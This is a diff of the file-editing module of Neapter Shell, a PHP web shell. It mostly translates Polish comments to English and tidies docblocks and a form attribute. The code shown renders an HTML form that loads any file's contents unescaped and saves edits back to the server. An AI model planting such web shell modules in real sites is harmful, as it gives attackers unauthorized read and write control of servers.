@@ -3,27 +3,31 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Zmienianie uprawnien dla pliku
+ * Edit file content
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleEdit extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -32,9 +36,8 @@ class ModuleEdit extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
@@ -43,9 +46,8 @@ class ModuleEdit extends ModuleAbstract
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -60,9 +62,8 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public function get()
@@ -80,9 +81,10 @@ DATA;
             return self::getHelp();
         }
 
-        return sprintf('<form action="%s" method="post">' .
+        return sprintf(
+            '<form action="%s" method="post" autocomplete="on">' .
             '<textarea id="edit" name="filedata">%s</textarea><br/>' .
-            '<input type="text" name="cmd" readonly="readonly" value=":edit %s" size="110" id="cmd" autocomplete="on"/>' .
+            '<input type="text" name="cmd" readonly="readonly" value=":edit %s" size="110" id="cmd"/>' .
             '<input type="submit" name="submit" value="Zapisz" /></form>',
             Request::getCurrentUrl(),
             (string) file_get_contents($sFile),
